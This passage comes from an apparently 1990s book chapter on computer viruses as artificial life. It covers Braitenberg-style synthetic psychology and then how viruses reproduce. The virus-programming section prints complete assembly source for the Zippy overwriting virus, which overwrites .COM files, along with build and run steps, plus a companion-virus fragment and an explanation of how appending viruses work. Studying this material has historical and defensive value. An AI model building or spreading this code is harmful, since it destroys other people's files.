<p>Preditory viruses also exist. For instance, the Den Zuk virus will seek out and overwrite <strong>The Brain</strong> virus if both are present on the same system.</p>
<p>There are many other behaviors exhibited by computer viruses that would lead one to believe that computer viruses are, at the very least, a valid form of Artificial Life.</p>
<p>Christopher Langton agrees, saying that computer viruses are one of the closest things to artificial life in existence. He says, "In several instances, one computer
 
virus has overridden another, generating a virus nobody really wrote. This was a combination of two viruses, both viable, that spread around targetting the same sector of your disk."<sup><a href="#f64" name="b64">64</a></sup> This type of viral creation will be discussed later in the book.</p>
<p>Speaking on Artificial Life and computer viruses, Eugene Spafford offers us this warning:</p>
<blockquote>We must never lose sight of the fact that "real life" is of much more importance than "artificial life", and we should not allow our experiments to threaten our experimenters.<sup><a href="#f65" name="b65">65</a></sup></blockquote>
 
<h2><a name="pf"></a>Synthetic Psychology</h2>
<div class="epigraph">
"The chicken was the egg's idea for getting more eggs."
<p>-- Samuel Butler</p>
</div>
<br clear="all"/>
<p>Synthetic Psychology is an exciting, valid, but exceedingly underrated study. Finding its roots in 1965, there have been very few texts even referring to it, nor are there many scientists carrying out research in this area.</p>
<p>In his extremely energetic book, <em>VEHICLES: Experiments in Synthetic Psychology</em><sup><a href="#f66" name="b66">66</a></sup>, neuroanatomist Valentino Braitenberg describes his area of science. Seeking to understand how the brain evolved to become the powerful machine that it is today, he guides the reader through various mental experiments.</p>
<p>Employing the analogy of an imaginary <em>vehicle</em> to demonstrate his theory of the evolution of intelligence, Braitenberg transcends the imaginary via inanimate, but mobile mechanisms. Self-emergent behavioral patterns are arrived at through the emulation of programmed instincts<sup><a href="#f67" name="b67">67</a></sup>
 
whose attributes are easily accommodated in an animate vehicle. For simplicity, it is best imagined that the vehicles are floating in water. For those so inclined, these machines may be easily built using common components found at a good electronics surplus store.</p>
<h3><a name="pf1"></a>The Basic Vehicle</h3>
<p>The basic vehicle contains only one engine. Driving the engine is a single sensor able to recognize one pair of binary opposites and to react to either extreme. The vehicle may execute only two reactions (For example, fast and slow engine states), each of which correlates in one-on-one basis with one of the aforementioned sensory attributes (such as hot and cold temperatures).</p>
<p>Given only this set of rules, the vehicle can be set up to speed in warm water, and thus slow down in cool water. Also, the reverse of this is true: if the vehicle is set up to slow down in warm water, it will speed in cold water.</p>
<p>This vehicle presents a rather unintelligent object that reacts in a predictable pattern. As of yet, there is nothing spontaneous or even remarkable about its abilities.</p>
<h3><a name="pf2"></a>Giving the Vehicle a Sense of Direction</h3>
<p>A similar engine and sensor are added to the vehicle. By wiring up the motors so that the right motor runs in fast mode when a good stimulus is on the left, the vehicle will
 
steer itself towards the favourable stimulus. This is the method used to steer bulldozers, as well as other "tracked" vehicles. (See fig. XX.)</p>
<div align="center">
<img src="img/vkj00/fig1.gif" alt="Figure XX. Basic Steering in a Two Motor - Two Speed Vehicle"/>
<p><strong>Figure XX. Basic Steering in a Two Motor - Two Speed Vehicle</strong> (c)1993 PC Scavenger. Used by permission</p>
</div>
<p>This modification simply gives the vehicle a method of reaching favourable places, and fleeing from aversions. Such a vehicle might appear to decide that it must stay out of warm water and remain in the cold. Its reactions to each condition are very mechanical, however.</p>
 
<h3><a name="pf3"></a>Endowment of Several Senses</h3>
<p>Next step, several new sensory pairs are added to the original set of senses, along with corrosponding reactions.</p>
<p>If three signals tell an engine to go fast, and one signal does not say to go fast, then the engine will receive 3/4 of the total power is capable of receiving, and therefore will drive at 3/4 its total speed. Because the program is set up so that the opposite engine receives the opposite signal, 1/4 of the total power it is capable of receiving will be sent, and cause it to go 1/4 its total speed. The sum of these reactions will cause the vehicle to turn slightly in one direction.</p>
<p>The vehicles mentioned for this experiment will be fairly basic, and start off with only four senses. They will be able to sense and react in one of two ways to heat, light, water depth, and sound.</p>
<p>Perhaps a vehicle is built to drive towards the heat, bright light, shallow water and loud sounds. Seeing it in action, one may decide that this vehicle requires the heat, light, shallow water and loud sounds. This vehicle seems somewhat outgoing and friendly. It may even begin to remind its creator of him or herself. Yes, it is unmistakable: with little alteration, a vehicle like this would enjoy a day of rock and roll at the beach!</p>
 
<p>Another vehicle could be built in such a way that it drives away from warm areas, towards bright light, towards deep water and away from loud sounds. It is natural to imagine that this vehicle is drawn to colder water, does not like the dark, and requires silence. This vehicle may almost frighten its creator, being so similar to the folks next door. The vehicle seems likely to be way out there fishing on the cooler days, but otherwise is likely to sit around home complaining that it's too hot, and scream incessantly about the loud music the other vehicles are always playing.</p>
<p>Many other sensory receptors may be encorporated to detect such things as the colour red, the direction of water flow, the smell of peanut butter, the saltiness of water, purity of the air, or anything else imaginable. Any senses that may be added to the vehicle will lend themselves well to this sort of study. In fact, the more senses that are incorporated, the more interesting and autonomous the vehicle will seem.</p>
<h3><a name="pf4"></a>Variable Sensitivity</h3>
<p>A vehicle that is only able to react with one of two states to a stimulus presents a very banal instinctual being within the context of programmed reactions. The reason for this clause is that the vehicle will only react in one
 
manner to a given stimulus: an instinct. According to Random House Webster's, instinct is:</p>
<blockquote>"...an inborn pattern of activity or tendency to action common to a given species"<sup><a href="#f68" name="b68">68</a></sup></blockquote>
<p>By employing a rank-order system within the sensitivity of the sensor directly proportionate to the strength and distance of the stimulus, and by giving the vehicle direction and speed capabilities, behavioural patterns begin to emerge, such as reason, judgement and deliberation.</p>
<blockquote>
<dl>
<dt>Reason:</dt><dd><ol>
<li>a basis or cause, as for some belief, action, fact, or event.</li>
<li>...</li>
<li>the mental powers concerned with forming conclusions, judgments, or inferences.</li>
<li>sound judgment; good sense.</li>
<li>...</li>
<li>...</li>
<li>Philos.
<ol type="a">
<li>the faculty or power of acquiring intellectual knowledge, either by direct understanding of first principles or by argument.</li>
<li>the power of intelligent and dispassionate thought, or of conduct influenced by such thought.<sup><a href="#f69" name="b69">69</a></sup></li>
</ol></li>
</ol></dd>
</dl>
</blockquote>
 
<p>With this infinitely variable sensitivity, the vehicle may execute degrees of reactions (for example: it may travel fastest in boiling water, normal speed in warm water, but completely stop - hybernate? - in cold water), each of which correlates variably with the relative distance/strength of one of the aforementioned sensory attributes.</p>
<p>This works basically the same as the volume knob on a radio. The more the knob is turned in a clockwise direction, the louder the music becomes. Counter-clockwise turning of the knob would produce a quieter sound. And there is a maximum direction the knob can be turned in either direction.</p>
<p>If a vehicle senses something warmer on its left side than on its right, it may be drawn more to the left, and appear more interested in what was in that direction.</p>
<p>An interesting event occurs once a vehicle is able to respond variably to its surrounding. Where at one point it was an easy task to determine what motivates its reactions, it now becomes less "instinctual" and more "preferential". Certain traits begin to emerge that simply were not programmed into the vehicle. It becomes increasingly difficult for a person who has not seen the vehicle's internal workings to figure out what has actually been programmed into it.</p>
 
<h3><a name="pf5"></a>Adding Thresholds</h3>
<p>A threshold is the point at which a stimulus is of sufficient intensity to begin to produce an effect<sup><a href="#f70" name="b70">70</a></sup>. Vehicles will behave much more spontaneously when thresholds are introduced to a vehicle's sensory ability. Suddenly, the vehicle may find that a particular stimulus provides a certain amount of pleasure, then hastily leave when it loses interest, or when the stimulus becomes overbearing. It may even hover around the stimulator at a comfortable distance. Dependant on environmental context, each vehicle will react differently.</p>
<p>By being prevented from reacting until a certain sensation threshold has been met, the vehicle may appear to "think" before any reaction is elicited. Once the threshold has been met, it may gleefully speed towards the pleasure object, or it may become bored and saunter away, even quickening its pace as it gets further from the object. These responses are emergent, and are reinforced by its programmed instincts. It may even spin excitedly around its source of interest, hastily attacking any other vehicle getting too close for comfort! If the other vehicle has similar traits, they may wage war, the winner keeping the prized object. Or they may decide to share the object, being sure to keep their distance from each other.</p>
 
<p>Another emergent life-like quality often encountered is that during a time when it is "pondering", the vehicle may suddenly be side-tracked by another stimulus and trot off in a completely unexpected direction!</p>
<p>The territorial behaviors and absent-mindedness described above were not programmed explicitly. Reactions like these are the emergent properties that make this type of project so intriguing. It is virtually impossible to determine the working program of such a machine, based solely on how it reacts in its environment.</p>
<p>With the addition of thresholds, the emergent properties are limitless. The slightest alteration of variables processed by the sensors will produce new emergent traits. Incredibly, with each tweaking of parameters, new and unforeseen traits will manifest themselves spontaneously in the actions of the vehicle.</p>
<h3><a name="pf6"></a>Adding Advanced Life-like Properties</h3>
<p>Braitenberg teaches various methods for furnishing the vehicle with limited "memory". This way, it may remember significant events throughout the vehicle's lifespan. The ability to judge distance and direction, and therefore geographical position can also be imparted to the vehicle.</p>
<p>This is the essence of Synthetic Psychology: The creation of a emergent psychological traits (such as the
 
emergent instincts, behavior, and reasoning demonstrated in the vehicles) within a well-defined and inanimate environmental context.</p>
<p>In this context, there are three prerequisits:</p>
<ol>
<li>sensory ability and mobility.</li>
<li>the programming of various reactions to certain sets of stimuli.</li>
<li>the presence of those stimuli.</li>
</ol>
<p>The result of this context is consistent and reliable: instinct, behavior and reason emerge. This is very much like the psychology of the animate, but emerges in the inanimate. Because it is in the inanimate, it is called Synthetic Psychology.</p>
<h3><a name="pf7"></a>Artificial Life vs. Synthetic Psychology: A Comparison</h3>
<p>After reading the text on Artificial Life, one may be curious. "Isn't Synthetic Psychology just another form of Artificial Life?" It very much appears so, barring certain important details. In reality, they are almost unrelated, but share many similar functions.</p>
<p>Artificial Life examines lifeless matter, then adds various traits suggestive of life, resulting in a life-like being. Synthetic Psychology looks at a lifeless vehicle, gives it the ability to sense its surroundings, and act upon what it finds. Emerging from this is a similarly life-like being.</p>
 
<p>The major difference is this: Artificial Life attempts to create or study life by looking at, and simulating biological functions. Examples include reproduction and growth. Synthetic Psychology attempts to create or study psychology by looking at, and simulating psychological functions. Examples include fear and foresight. As has been described, life seems to be an emergent property ironically peculiar to both sciences.</p>
 
<h2><a name="pg"></a>...But is it Life?</h2>
<p>To return to a key question, ie: Is a computer virus a valid form of artificial life? Steen Rasmussen wrote:</p>
<blockquote>
<h1>Aspects of Information, Life Reality, and Physics</h1>
<h2>Information and Life:</h2>
<ol type="I">
<li>A universal computer is indeed universal and can emulate any process. (Turing)</li>
<li>The essence of life is a process (von Neumann)</li>
<li>There exists criteria by which we are able to distinguish living from non-living things.</li>
</ol>
<p>Accepting (I), (II), and (III) implies the possibility of life in a computer.</p>
<h2>Life and Reality:</h2>
<ol type="I" start="4">
<li>If somebody manages to develop life in a computer environment, which satisfied (III), it follows from (II) that these lifeforms are just as much alive as you and I.</li>
<li>Such an artificial organism must perceive a reality R<sub>2</sub>, which for itself is just as real as our "real" reality R<sub>1</sub> is for us.</li>
<li>From (V) we conclude that R<sub>1</sub> and R<sub>2</sub> have the same ontological status. Although R<sub>2</sub> in a material way is imbedded in R<sub>1</sub>, R<sub>2</sub> is independent of R<sub>1</sub>.</li>
</ol>
<h2>Reality and Physics:</h2>
<ol type="I" start="7">
<li>If R<sub>1</sub> and R<sub>2</sub> have the same ontological status it might be possible to learn something about the fundamental properties of realities in general, and of R<sub>2</sub> in particular, by studying the details of
 
different R<sub>2</sub>'s. An example of such a properties is the physics of a reality.<sup><a href="#f71" name="b71">71</a></sup></li>
</ol>
</blockquote>
<p>If one is to agree with the above criteria, then it must be understood that artificial is, in some way, alive, and that computer viruses are very much alive in their own reality (R<sub>2</sub>).</p>
<p>Some people will disagree, saying that viruses are not alive because they only exist within an electronic environment (in other words, R<sub>2</sub> is not appropriate for life because it is built up of electric pulses only). The reality of the situation is that humans are also comprised of energy, although of a different level. We cannot discount the computer virus as a life form because of the different source of energy input. Such a double standard toward computer viruses is glaringly anthropocentric.</p>
<p>Some believe that the definition of life should be altered, so as to not include computer viruses! Eugene Spafford says:</p>
<blockquote>"To suggest that computer viruses are alive also implies to me that some part of their environment -- the computers, programs, or operating systems -- also represents artificial life. Can life exist in an otherwise barren and empty ecosystem? A definition of "life" should probably include something about the environment in which that life exists."<sup><a href="#f72" name="b72">72</a></sup></blockquote>
 
<p>This so-called barren and empty ecosystem is fertile breeding ground for life forms which thrive on the electrical currents present. There is an ecological context to the computer simply because the computer is comprised of energy input and energy output systems that can be controlled. The computer virus monopolises these vital energies. Moreover, the computer virus can seriously manipulate and/or damage the hardware and software in its environment.</p>
<p>We ought not assume that Artificial Life or Synthetic Psychology is somehow secondary or lesser; life-as-we-know-it also emerged from an inanimate chemical combination, DNA.</p>
 
<h2><a name="ph"></a>Computer Virus Programming</h2>
<p>Because of the inclusion of source code examples, this, and the ensuing chapter will probably agitate the sensibilities of many readers. Before continuing, it must be noted that it is exactly this attitude and phobia that allowed computer viruses became rampant in the first place. It is important to understand, both for scientific reasons, and for security reasons, how computer viruses function, and what useful technologies they have introduced to the computer industry.</p>
<p>Many years ago, several companies began producing "cures" for the known viruses. As each cure was defeated by the virus writers, new ones had to be created. Soon, viruses became a lucrative industry much too dependent on mass ignorance to disclose its many secrets.</p>
<p>Through staged media events and incompetent reporting, the public has become both oblivious to and afraid of the facts. So long as viruses are the abominable and cryptic entities that they have been presented as being, they shall thrive heartily. Once techno-peasants overcome their religious fear of the unknown, it will become clear that there is no reason for the longevity that the computer virus threat has been granted.</p>
 
<p>Also, it must be noted that this is not a crash-course in viral development, but rather an exploration of the various functions and technologies used in computer viruses. There are several good underground publications dedicated to teaching the art of virus writing (See Suggested Reading in the appendices). This chapter will prove highly beneficial to those learning to write viruses, but is aimed principally at programmers wishing to understand how they work. Many of the techniques explored exhibit significant commercial value and potential.</p>
<h3><a name="ph1"></a>Reproduction</h3>
<p>The single function that sets a virus apart from any other computer program is its ability to reproduce. This is a facility for the virus to insert a functional copy of itself into a another executable file so that its victim, in turn, is able to promote further propagation.</p>
<p>Computer viruses use a variety of methods to reproduce. Once these are understood, computer viruses no longer present a threat. (Refer to Chapter Three for a discussion of available anti-virus methods and technologies)</p>
<h4><a name="ph11"></a>Overwriting Viruses</h4>
<p>Overwriting viruses are the most primitive form of computer virus. They have been given many different, often home-made monikers by those who do not like to classify them
 
as viruses. Because they do not contain all the neccessary functions of a typical virus, the overwriting virus is more akin to the biological <em>viroid</em><sup><a href="#f73" name="b73">73</a></sup>.</p>
<p>In its utmost simplicity, the overwriting virus serves no other function but to write its code overtop the beginning of the victim file so that it too becomes a virus. Because the victim will no longer function as expected, detection is almost immediate. The only cure, however, is to overwrite the infected file with a clean copy of the file from a backup diskette.</p>
<p>The <strong>Zippy</strong> virus is an example of an overwriting virus. It is devoid of any extraneous code, and only contains the functions needed to successfully propagate itself. The source code is simple and well documented; a debug script plus instructions for creating the virus using DEBUG.COM appears in the appendices.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">COMMENT~===============================================================<br/>
=<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Zippy Overwriting Virus<br/>
=<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">-----------------------</span><br/>
=<br/>
= &nbsp; &nbsp; &nbsp; Dissassembly <span style="color: black;">&#40;</span>c<span style="color: black;">&#41;</span><span style="color: #ff0000;">1993</span> Karsten Johansson<span style="color: #339933;">,</span> PC Scavenger<br/>
=<br/>
=<br/>
=<br/>
=======================================================================<br/>
=<br/>
<br/>
=<br/>
=<br/>
= &nbsp;CAUTION<span style="color: #339933;">:</span> This virus contains damaging <span style="color: #0000ff; font-weight: bold;">code</span>!! <span style="color: #0000ff; font-weight: bold;">Do</span> <span style="color: #00007f; font-weight: bold;">NOT</span> execute it <span style="color: #00007f; font-weight: bold;">in</span><br/>
=<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; directories with useful <span style="color: #339933;">.</span>COM files<span style="color: #339933;">.</span><br/>
=<br/>
=<br/>
=<br/>
= &nbsp;NOTES<span style="color: #339933;">:</span> &nbsp; The Zippy virus is an overwriting virus<span style="color: #339933;">.</span> Because of<br/>
=<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; this<span style="color: #339933;">,</span> all infected files lose their proper functionality<span style="color: #339933;">.</span><br/>
=<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Instead<span style="color: #339933;">,</span> any attempt to execute an infected file will<br/>
=<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; result <span style="color: #00007f; font-weight: bold;">in</span> virus activity<span style="color: #339933;">.</span> Only experiment with target<br/>
=<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; files which are easily replaced<span style="color: #339933;">.</span> <span style="color: #0000ff; font-weight: bold;">Do</span> <span style="color: #00007f; font-weight: bold;">not</span> forget to delete<br/>
=<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; all infected files when experimentation is finished<span style="color: #339933;">.</span><br/>
=<br/>
=<br/>
=<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DO</span> <span style="color: #00007f; font-weight: bold;">NOT</span> INFECT ANYONE<span style="color: #7f007f;">'S SYSTEM BUT YOUR OWN! To do so is a<br/>
=<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; federal offence.<br/>
=<br/>
=<br/>
=<br/>
= &nbsp;COMPILE: With TASM: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; TASM ZIPPY<br/>
=<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;TLINK ZIPPY<br/>
=<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;EXE2BIN ZIPPY ZIPPY.COM<br/>
=<br/>
=<br/>
=<br/>
= &nbsp;INSTALL: Simply execute the compiled virus in a directory<br/>
=<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; containing the target .COM files.<br/>
=<br/>
=<br/>
=<br/>
=======================================================================<br/>
=<br/>
=<br/>
=<br/>
= &nbsp;BEFORE COMPILING THIS CODE, IT MUST BE NOTED THAT THE AUTHOR AND<br/>
=<br/>
= &nbsp;PUBLISHER OF THIS BOOK CANNOT BE HELD LIABLE FOR ANY DAMAGES THAT<br/>
=<br/>
= &nbsp;MAY BE INCURRED BY THE USE OF OR THE EXPERIMENTATION WITH COMPUTER<br/>
=<br/>
= &nbsp;VIRUSES. THIS BOOK IS FOR EDUCATIONAL PURPOSES ONLY. EDUCATION IS<br/>
=<br/>
<br/>
= &nbsp;NOT HERE TO BE ABUSED.<br/>
=<br/>
=<br/>
=<br/>
=======================================================================<br/>
~<br/>
&nbsp; &nbsp; &nbsp; &nbsp; .model tiny<br/>
&nbsp; &nbsp; &nbsp; &nbsp; .code<br/>
&nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; 100h<br/>
zippy:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,4Eh&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Search for a file<br/>
&nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; cx,cx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; with NORMAL attributes<br/>
&nbsp; &nbsp; &nbsp; &nbsp; lea &nbsp; &nbsp; dx,comfile&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; and has a .COM extension.<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 21h<br/>
&nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,3D01h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Open file with write access<br/>
&nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; dx,9Eh&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; using ASCIIZ filename from DTA<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 21h<br/>
&nbsp; &nbsp; &nbsp; &nbsp; xchg&nbsp; &nbsp; bx,ax<br/>
&nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ah,40h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Write the virus code<br/>
&nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; dx,si &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; starting from the beginning<br/>
&nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cx,virend-zippy &nbsp; &nbsp; &nbsp; &nbsp; ; until all virus bytes are written<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 21h<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ret &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Drop to DOS<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <br/>
comfile:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; db&nbsp; &nbsp; &nbsp; '</span><span style="color: #339933;">*.</span>COM<span style="color: #7f007f;">',0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Used for victim search<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <br/>
virend: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Simple marker to calculate length of<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; virus code<br/>
end &nbsp; &nbsp; zippy<br/>
</span></div>
<p>The <strong>Zippy</strong> virus contains only two main functions: A search routine and a reproduction routine. First, it attempts to find a file to infect. Assuming that a target has been acquired, the file is opened (prepared for reading/writing) using the name as held in the Disk Transfer Area<sup><a href="#f74" name="b74">74</a></sup> which was created by the search routine. The virus
 
code is then written on top of the victim's code before control is passed back to DOS.</p>
<p>The following diagram represents the overwriting reproductive method. Generally all overwriting viruses work via the same modus operendi.</p>
<div align="center">
<img src="img/vkj00/fig2.gif" alt="Figure XX. Reproduction of the Zippy Overwriting Virus"/>
<p><strong>Figure XX. Reproduction of the Zippy Overwriting Virus</strong> (c) 1993 PC Scavenger, Used by permission</p>
</div>
<h4><a name="ph12"></a>Companion Viruses</h4>
<p>Companion viruses are the second most rudimentary form in computer virus technology. In fact, their infection method is so unusual that it was once argued that this type of program was not a virus at all! Because companion infections fulfill all the requirements listed in chapter 1, they certainly seem like computer viruses. Companion viruses are, at the very least, parasites. Arguing the
 
matter would prove fruitless. Directory infectors like the <strong>Dir ][</strong> face the same dilemma when viewed in this light.</p>
<p>There are only three filename extensions that DOS will search for when an attempt is made to execute a file. They are .BAT, .COM and .EXE. Whenever something is typed at the DOS command line, the command interpreter (COMMAND.COM) assumes that it is a command. For example, type:</p>
<pre class="source">
ATTRIB
</pre>
<p>at the command line, and press enter.</p>
<p>When this has been completed, the command interpreter checks whether it is an internal command, like DIR or CD. Since it is not, all directories listed by the PATH command are searched for a file called ATTRIB.COM. One is not found, so the search begins again, but for ATTRIB.EXE. This time, it should find ATTRIB, as it is an .EXE file. It will then be executed. If ATTRIB.EXE does not exist on your drive, DOS will search for ATTRIB.BAT before giving up, and generating an error message.</p>
<p>Companion viruses exploit this process. To infect ATTRIB.EXE, a companion virus creates a copy of itself in the same directory as the command itself, store the name of the file it is infecting, then name the copy of itelf ATTRIB.COM.</p>
 
<p>All subsequent executions of ATTRIB will run the viral ATTRIB.COM first. Once the virus has finished its duties, it exits by causing COMMAND.COM to execute ATTRIB.EXE. Paradoxically, companion viruses are the most difficult to detect with most standard virus scanning techniques, but it is a simple matter to find and disinfect them with a command-line interface like DOSSHELL or Norton Commander (or, for that matter, the ATTRIB.EXE will display the hidden files). Simply look for hidden .COM files that do not belong in the directories, and delete them. If only all viruses were this easy to remove!</p>
<div align="center">
<img src="img/vkj00/fig3.gif" alt="Figure XX. Reproduction in Companion Viruses"/>
<p><strong>Figure XX. Reproduction in Companion Viruses</strong> (c) 1993 PC Scavenger. Used by permission</p>
</div>
<p>Following is a code fragment similar to that found in
the <strong>Zeno</strong> virus. The code demonstrates how filenames are passed directly to the command interpreter for execution. The interrupt used to accomplish this is undocumented. When it is used, the normal command search is overlooked, and the .EXE file is executed as if the virus did not exist.</p>
 
 
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;RUN_ATTRIB: This file does nothing except demonstrate how a companion</span><br/>
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;virus passes the host file's name to COMMAND.COM to be</span><br/>
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;executed. NOTE: This code segment is not a complete</span><br/>
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;program.</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>model&nbsp; tiny<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; <span style="color: #ff0000;">100h</span><br/>
<br/>
run_attrib<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ds=cs</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>filename &nbsp; &nbsp; <span style="color: black; font-style: italic;">;file name to pass to COMMAND.COM</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">2Eh</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;**UNDOCUMENTED**</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <br/>
filename<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'ATTRIB.EXE'</span><span style="color: #339933;">,</span>0D <span style="color: black; font-style: italic;">;name of file to execute, terminated by CR</span><br/>
end &nbsp; &nbsp; run_attrib<br/>
&nbsp;</div>
<h4><a name="ph13"></a>Appending Viruses</h4>
<p>There are three types of appending viruses. They are .COM infectors, .EXE infectors, and .COM/.EXE infectors. As the .COM/.EXE infector virus is simply a combination of the first two formats, it will not be described here.</p>
<h4><a name="ph14"></a>Appending .COM Viruses</h4>
<p>.COM files are the most rudimentary of binary executable files. They are loaded into memory at offset 0100h in all cases<sup><a href="#f75" name="b75">75</a></sup>, and are limited to 64 kilobytes of code. Because headers are not used, as they are in .EXE files, alteration is a very easy feat.</p>
 
<p>A basic appending virus simply appends a copy of its code to the end of the victim file. Then the first three or four bytes of the file are stored within the virus' body. If the virus is successful, it then calculates the offset from the beginning of the victim to the beginning of the virus, and inserts a JMP (Assembler language command to JuMP) to the beginning of the virus code (at offset 0100h).</p>
<p>When the file is subsequently executed, the new jump causes the virus to run instead. Once the virus code is finished executing, the first few bytes are restored, and the program jumps back to the beginning. The code then runs as if nothing had changed. Figure XX is a graphical depiction of infected program execution as it would appear in memory.</p>
<p>The <strong>Proto-3</strong> virus, featured at the end of chapter 6, is a .COM appending virus. The <strong>Lezbo</strong> virus will infect .COM, .EXE or .OVL files by appending copies of itself as well.</p>
 
<div align="center">
<img src="img/vkj00/fig4.gif" alt="Figure XX. Execution of an infected .COM file as code appears in memory."/>
<p><strong>Figure XX. Execution of an infected .COM file as code appears in memory.</strong> (c) 1993 PC Scavenger, Used by permission</p>
</div>
<h4><a name="ph15"></a>Appending .EXE Viruses</h4>
<p>.EXE files are very different than .COM files. In order to infected such a file, it is important to understand the .EXE file format.</p>
<p>Whereas a .COM file is simply an executable memory image fully contained in one segment, .EXE files contain several distinct segments. The main segments are organized in the .EXE header. Additional segments are initialized within the code. Following is a basic file which can be debugged and examined without much effort.</p>
 
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;Simple.COM file which will be converted to an .EXE file.</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>model&nbsp; tiny<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; <span style="color: #ff0000;">100h</span><br/>
<br/>
Hello<span style="color: #339933;">:</span><br/>
